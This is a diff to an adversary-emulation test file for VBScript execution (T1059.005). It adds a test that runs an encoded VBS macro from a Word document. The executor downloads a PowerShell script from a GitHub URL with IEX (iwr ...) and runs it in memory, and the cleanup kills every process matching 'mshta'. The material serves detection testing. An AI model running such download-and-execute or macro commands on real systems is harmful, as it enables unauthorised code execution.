@@ -23,11 +23,43 @@ atomic_tests:
       New-Item -ItemType Directory (Split-Path #{vbscript}) -Force | Out-Null
       Copy-Item $env:TEMP\sys_info.vbs #{vbscript} -Force
   executor:
-    command: 'cscript #{vbscript} > $env:TEMP\out.txt'
+    command: 'cscript #{vbscript} > $env:TEMP\T1059.005.out.txt'
     cleanup_command: |-
       Remove-Item $env:TEMP\sys_info.vbs -ErrorAction Ignore
       Remove-Item $env:TEMP\T1059.005.out.txt -ErrorAction Ignore
     name: powershell
+
+- name: Encoded VBS code execution
+  auto_generated_guid: e8209d5f-e42d-45e6-9c2f-633ac4f1eefa
+  description: |
+    This module takes an encoded VBS script and executes it from within a malicious document. By default, upon successful execution
+    a message box will pop up displaying "ART T1059.005"
+
+    A note regarding this module, due to the way that this module utilizes "ScriptControl" a 64bit version of Microsoft Office is required.
+    You can validate this by opening WinWord -> File -> Account -> About Word
+  supported_platforms:
+  - windows
+  dependency_executor_name: powershell
+  dependencies:
+  - description: |
+      The 64-bit version of Microsoft Office must be installed
+    prereq_command: |
+      try {
+        $wdApp = New-Object -COMObject "Word.Application"
+        $path = $wdApp.Path
+        Stop-Process -Name "winword"
+        if ($path.contains("(x86)")) { exit 1 } else { exit 0 }
+      } catch { exit 1 }
+    get_prereq_command: |
+      Write-Host "You will need to install Microsoft Word (64-bit) manually to meet this requirement"
+  executor:
+    command: |
+      IEX (iwr "https://raw.githubusercontent.com/redcanaryco/invoke-atomicredteam/master/Public/Invoke-MalDoc.ps1")
+      Invoke-Maldoc -macroFile "PathToAtomicsFolder\T1059.005\src\T1059.005-macrocode.txt" -officeProduct "Word" -sub "Exec"
+    cleanup_command: |
+      Get-WmiObject win32_process | Where-Object {$_.CommandLine -like "*mshta*"}  | % { "$(Stop-Process $_.ProcessID)" } | Out-Null
+    name: powershell
+
 - name: Extract Memory via VBA
   auto_generated_guid: 
   description: |
